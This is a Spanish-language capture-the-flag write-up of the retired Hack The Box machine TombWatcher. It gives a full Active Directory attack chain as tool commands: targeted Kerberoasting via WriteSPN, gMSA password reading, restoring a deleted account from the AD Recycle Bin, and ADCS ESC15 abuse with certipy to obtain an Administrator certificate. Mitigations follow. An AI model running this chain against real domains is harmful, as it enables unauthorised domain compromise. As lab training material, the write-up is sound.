---
machine: TombWatcher
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, kerberoasting, gmsa, recycle-bin, adcs-esc15]
---

# TombWatcher — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Con credenciales de `henry`, `WriteSPN` sobre `alfred` permite un Kerberoasting dirigido. `alfred` puede unirse a `INFRASTRUCTURE`, grupo que lee la contraseña de una gMSA. Una cuenta eliminada se restaura desde la Papelera de AD y se abusa de ESC15 para emitir un certificado de Administrator.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p53,88,135,139,389,445,464,593,636,3268,5985,9389 <IP>
```

- Controlador de dominio con Kerberos, LDAP, SMB y WinRM.
- Credenciales iniciales de `henry` proporcionadas por el escenario.

## Enumeración

BloodHound identifica que `henry` tiene `WriteSPN` sobre `alfred`.

```bash
bloodhound-python -u henry -p '<PASSWORD>' -d tombwatcher.htb -ns <IP> -c All
```

El permiso permite asignar un SPN temporal a `alfred` y solicitar un TGS para crackearlo offline.

```bash
impacket-GetUserSPNs tombwatcher.htb/henry:'<PASSWORD>' -dc-ip <IP> -request-user alfred
hashcat -m 13100 alfred.tgs wordlist.txt
```

## Movimiento lateral

`alfred` puede añadirse al grupo `INFRASTRUCTURE`. Los miembros de ese grupo pueden leer la contraseña de la cuenta de servicio gestionada `ansible_dev$`.

```bash
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> add groupMember INFRASTRUCTURE alfred
nxc ldap <IP> -u alfred -p '<PASSWORD>' --gmsa
```

## Escalada de privilegios

La cuenta `cert_admin` fue eliminada, pero sigue en la Papelera de AD. Se restaura, se le cambia la contraseña y se usa para enumerar ADCS. La plantilla `WebServer` es vulnerable a ESC15 (CVE-2024-49019); se solicita un certificado con UPN de Administrator.

```bash
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> restore cert_admin
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> set password cert_admin '<NEW_PASSWORD>'
certipy find -u cert_admin@tombwatcher.htb -p '<NEW_PASSWORD>' -dc-ip <IP> -vulnerable
certipy req -u cert_admin@tombwatcher.htb -p '<NEW_PASSWORD>' -ca <CA> -template WebServer -upn administrator@tombwatcher.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

El certificado permite autenticarse como Administrator y obtener el hash de dominio.

## Evidencia

- Salida de BloodHound con `WriteSPN`.
- TGS solicitado, hash redactado.
- Lectura de la gMSA y restauración de `cert_admin`.
- Plantilla ESC15 y certificado emitido, sin material real.
- Flag redactada.

## Lecciones aprendidas

- `WriteSPN` es suficiente para un Kerberoasting dirigido.
- Las cuentas eliminadas pueden seguir en la Papelera de AD.
- ESC15 permite influir en el UPN de un certificado sin una plantilla ESC1 clásica.

## Mitigaciones y detección

- Limitar `WriteSPN` y revisar ACL de cuentas de servicio.
- Restringir quién puede leer gMSA y auditar cambios de grupo.
- Proteger la Papelera de AD y monitorizar restauraciones.
- Auditar plantillas ADCS y aplicar las actualizaciones de ESC15.

## Referencias

- <https://www.hackthebox.com/machines/tombwatcher>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-49019>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin>
- <https://attack.mitre.org/techniques/T1558/003/>
